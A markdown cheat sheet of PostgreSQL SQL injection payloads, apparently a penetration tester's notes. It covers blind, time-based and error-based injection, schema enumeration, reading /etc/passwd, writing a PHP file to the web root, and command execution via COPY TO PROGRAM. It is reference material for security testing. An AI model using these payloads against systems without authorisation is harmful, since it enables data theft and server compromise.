# SQLi for [PostgreSQL](https://www.postgresql.org/)

## Things to remember
  *  HackTricks has [multiple](https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection) [pages](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) for PostgreSQL
  *  [`ILIKE`](https://www.postgresql.org/docs/current/functions-matching.html)/[`LOWER()`](https://www.postgresql.org/docs/current/functions-string.html) to change/ensure case matching
  *  PostgreSQL usually supports stacked queries
  *  Boolean and time-based injections are versatile... get creative!

## Common errors
  *  `column "X" does not exist` caused by literal string values wrapped in double quotes, use single
  *  `argument of AND must be type boolean` caused by comparison operator being passed a non-bool type

## DBMS instance details
  *  DBMS version, current database/user, data directory, etc.
      *  Data directory used to [store PostgreSQL stuff](https://www.postgresql.org/docs/current/storage.html)

```
(SELECT version())
(SELECT current_database())
(SELECT current_user)
(SELECT setting from pg_settings WHERE name = 'data_directory')
```

## Boolean-based blind
  *  Infer DB contents from true/false responses
  *  A simple way to induce this type of response is to use `OR`/`AND` operators
      *  More complex ways could also exist depending on the application
  *  [`ASCII()`](https://www.postgresql.org/docs/current/functions-string.html#:~:text=ascii) and [`SUBSTRING()`](https://www.postgresql.org/docs/current/functions-string.html) to prepare characters for binary search comparison

```
(SELECT TRUE WHERE current_database() LIKE '%')
(SELECT TRUE WHERE ASCII(SUBSTRING(current_database(), 1, 1)) < 127)
```

## Time-based blind
  *  Infer DB contents by forcing the server to wait and measuring response times
  *  `AND`/`OR` may cause errors, subquery must return boolean values in some instances
      *  Concatenate operator `||` is useful in these instances
  *  [`PG_SLEEP()`](https://www.postgresql.org/docs/current/functions-datetime.html#FUNCTIONS-DATETIME-DELAY) is obvious for this, but more exist
      *  Ex: [`GENERATE_SERIES()`](https://www.postgresql.org/docs/current/functions-srf.html#FUNCTIONS-SRF) can be used to waste CPU cycles, creating a delay

```
(SELECT TRUE FROM PG_SLEEP(5) WHERE current_database() ILIKE '%')
(SELECT '' FROM PG_SLEEP(5) WHERE ASCII(SUBSTRING(current_database(), 1, 1)) < 127)
```

## Error-based
  *  Cause an error that contains the result of a subquery
      *  Useful if errors are rendered on the page
  *  `OR`/`AND` operators useful to include error-causing functions
  *  [PayloadsAllTheThings has a section](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based) covering this
  *  [`CAST()`](https://github.com/sqlmapproject/sqlmap/blob/2f01cbf71fcd48bb20f9394ff6f088211305277e/data/xml/payloads/boolean_blind.xml#L525) function useful for intentionally causing errors
      *  The function example listed below is **NOT** used correctly... duh!

```
1=CAST(current_database() AS NUMERIC)
```

## Enumerate databases, tables, and columns
  *  List current database or all databases
      *  [`string_agg()`](https://www.postgresql.org/docs/current/functions-aggregate.html#:~:text=string_agg) used to return single-value from subquery
  *  List all tables or all tables within a given database
  *  List all columns within a given table
      *  Fuzz number of columns using `ORDER BY`/`UNION` operators

```
(SELECT current_database())
(SELECT string_agg(datname, ',') FROM pg_database)
(SELECT string_agg(table_name, ',') FROM information_schema.tables)
(SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_catalog=current_database())
(SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_catalog='exampleDB')
(SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='exampleTable')
```

## System interaction
  *  Filesystem access, read/write files to/from the filesystem
      *  See [`pg_proc`](https://www.postgresql.org/docs/current/catalog-pg-proc.html) table to check for privs to file functions
      *  [`ARRAY_TO_STRING()`](https://www.postgresql.org/docs/current/functions-array.html#:~:text=array_to_string) and [`ARRAY_AGG()`](https://www.postgresql.org/docs/current/functions-aggregate.html#:~:text=array_agg) functions used to convert array to string
  *  Read files from filesystem using [`pg_read_file()`](https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-GENFILE)
      *  `Permission denied` can indicate file perms issues or `apparmor`
      *  [`encode()`](https://www.postgresql.org/docs/current/functions-binarystring.html#FUNCTION-ENCODE) used to easily render file contents on page as hex
  *  List directory contents with [`pg_ls_dir()`](https://www.postgresql.org/docs/current/functions-admin.html#:~:text=pg_ls_dir)
  *  Write files to filesystem using [`COPY`](https://www.postgresql.org/docs/current/sql-copy.html)
      *  Cannot write binary or newlines (one-liners required)
  *  `COPY` can also be leveraged for RCE
      *  Must be superuser or member of [`pg_execute_server_program`](https://www.postgresql.org/docs/current/predefined-roles.html#:~:text=pg_execute_server_program) group
      *  Single quotes are escaped with double-single quotes: `'` becomes `''`

```
(SELECT ARRAY_TO_STRING(ARRAY_AGG(proacl), ', ') FROM pg_proc WHERE proname='pg_read_file')
(SELECT encode(pg_read_file('/etc/passwd')::bytea, 'hex'))
COPY (SELECT '<?php phpinfo(); ?>') TO '/var/www/html/phpinfo.php'
COPY (SELECT '') TO PROGRAM 'ping -c 3 127.0.0.1'
```
